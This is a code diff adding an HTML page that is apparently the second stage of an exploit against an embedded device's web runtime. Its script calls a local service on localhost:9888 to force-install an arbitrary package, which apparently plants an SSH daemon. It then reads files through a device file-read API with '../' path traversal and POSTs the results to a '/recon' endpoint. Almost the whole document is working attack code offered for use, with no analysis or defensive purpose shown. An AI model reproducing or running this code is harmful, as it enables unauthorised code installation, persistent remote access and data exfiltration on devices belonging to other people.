@@ -1,0 +1,51 @@
+<!doctype html>
+<!-- phase B: trigger superwatch install cmd 53 (09.09O), then read the
+     result file + installer log. Saves to /recon. -->
+<html><head><meta charset="utf-8"><title>trigger-b</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace"><pre id="o">phase B…</pre>
+<script>
+(function () {
+  "use strict";
+  var O = document.getElementById('o');
+  function log(m) { O.textContent += "\n" + m; return m; }
+  function post(t) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/api/recon", false);
+      x.setRequestHeader("Content-Type", "text/plain");
+      x.send("TRIGGER-B\n" + t);
+    } catch (e) {}
+  }
+  function raw(path) {
+    try {
+      var r = HiUtils_createRequest("fileRead", { path: path, mode: 6 });
+      var msg = r.msg;
+      if (msg != null && typeof msg === "object") msg = JSON.stringify(msg);
+      return { ret: r.ret, msg: String(msg == null ? "" : msg).slice(0, 3000) };
+    } catch (e) { return { exception: String(e) }; }
+  }
+  var SID = 81;
+  setTimeout(function () {
+    var out = [];
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "https://localhost:9888/function/basic/fetch/sw2", false);
+      x.setRequestHeader("identifier", "");
+      x.send(JSON.stringify({ list: [SID + ":53:" + SID + ";/APPS/installer.ipk;re.installer;"] }));
+      out.push("trigger -> " + String(x.responseText || "").slice(0, 300));
+    } catch (e) { out.push("trigger EXC " + e.name + ": " + e.message); }
+    post(out.join("\n"));
+    log(out.join("\n"));
+    setTimeout(function () {
+      out.push("result: " + JSON.stringify(raw("../tmp/ipk_install_result")));
+      post(out.join("\n"));
+      setTimeout(function () {
+        out.push("log: " + JSON.stringify(raw("../APPS/.re_sshd/installer_log.txt")));
+        out.push("sshd_dir: " + JSON.stringify(raw("../APPS/.re_sshd")));
+        post(out.join("\n"));
+        log(out.join("\n"));
+      }, 4000);
+    }, 12000);
+  }, 1500);
+})();
+</script></body></html>
